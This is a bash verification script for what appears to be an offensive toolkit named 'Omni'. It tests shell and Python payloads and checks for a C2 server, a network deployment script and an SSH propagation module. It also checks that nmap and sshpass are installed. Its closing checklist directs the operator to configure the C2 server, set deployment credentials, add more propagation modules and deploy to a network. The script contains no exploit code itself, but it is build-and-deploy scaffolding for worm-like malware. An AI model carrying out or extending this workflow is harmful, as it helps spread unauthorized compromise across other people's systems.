#!/bin/bash
echo "========================================"
echo "🔍 ENHANCED OMNI VERIFICATION"
echo "========================================"

# Test shell payload
echo "[1] Testing Shell Payload:"
timeout 10 ./payloads/v1.0/omni_final.sh --test > /tmp/omni_test.log 2>&1
if [ $? -eq 0 ]; then
    echo "    ✅ Shell payload works"
    echo "    Output sample:"
    grep -E "\[\+\]|\[\*\]" /tmp/omni_test.log | head -5 | sed 's/^/      /'
else
    echo "    ❌ Shell payload failed"
    tail -5 /tmp/omni_test.log | sed 's/^/      /'
fi

# Test Python payload
echo ""
echo "[2] Testing Python Payload:"
timeout 10 python3 payloads/v1.0/omni_final.py --test > /tmp/omni_py_test.log 2>&1
if [ $? -eq 0 ]; then
    echo "    ✅ Python payload works"
else
    echo "    ❌ Python payload failed"
    tail -5 /tmp/omni_py_test.log | sed 's/^/      /'
fi

# Check deployment scripts
echo ""
echo "[3] Deployment Scripts:"
if [ -f "deploy_network.sh" ]; then
    echo "    ✅ Network deployment script exists"
else
    echo "    ❌ Missing deploy_network.sh"
fi

if [ -f "c2_server.py" ]; then
    echo "    ✅ C2 server template exists"
else
    echo "    ❌ Missing c2_server.py"
fi

# Check modules
echo ""
echo "[4] Propagation Modules:"
if [ -f "modules/ssh_propagator.py" ]; then
    echo "    ✅ SSH propagator module exists"
    
    # Test SSH module
    echo "    Testing SSH module..."
    timeout 5 python3 modules/ssh_propagator.py > /tmp/ssh_test.log 2>&1
    if grep -q "Testing SSH propagation" /tmp/ssh_test.log; then
        echo "    ✅ SSH module test passed"
    else
        echo "    ⚠ SSH module test output:"
        tail -3 /tmp/ssh_test.log | sed 's/^/      /'
    fi
else
    echo "    ❌ Missing SSH propagator"
fi

# System check
echo ""
echo "[5] System Capabilities:"
if command -v nmap >/dev/null 2>&1; then
    echo "    ✅ nmap available"
else
    echo "    ⚠ nmap not installed (optional)"
fi

if command -v sshpass >/dev/null 2>&1; then
    echo "    ✅ sshpass available"
else
    echo "    ⚠ sshpass not installed"
fi

if command -v python3 >/dev/null 2>&1; then
    echo "    ✅ python3 available"
else
    echo "    ❌ python3 missing"
fi

# Git status
echo ""
echo "[6] Repository Status:"
git status --short 2>/dev/null | head -5 | sed 's/^/    /'
echo "    RID: rad:z3HQrWKN26thtyeF43UdjVcJcbe6"

echo ""
echo "========================================"
echo "🚀 ENHANCED VERIFICATION COMPLETE"
echo "========================================"
echo ""
echo "📋 Next Actions:"
echo "   1. Configure C2 server (edit c2_server.py)"
echo "   2. Set deployment credentials (edit deploy_network.sh)"
echo "   3. Add more propagation modules"
echo "   4. Test on isolated network"
echo ""
echo "🔧 Commands:"
echo "   ./verify_enhanced.sh          # Run this test"
echo "   ./deploy_network.sh           # Deploy to network"
echo "   python3 c2_server.py          # Start C2 server"
echo "   python3 omni_generator.py     # Generate payloads"
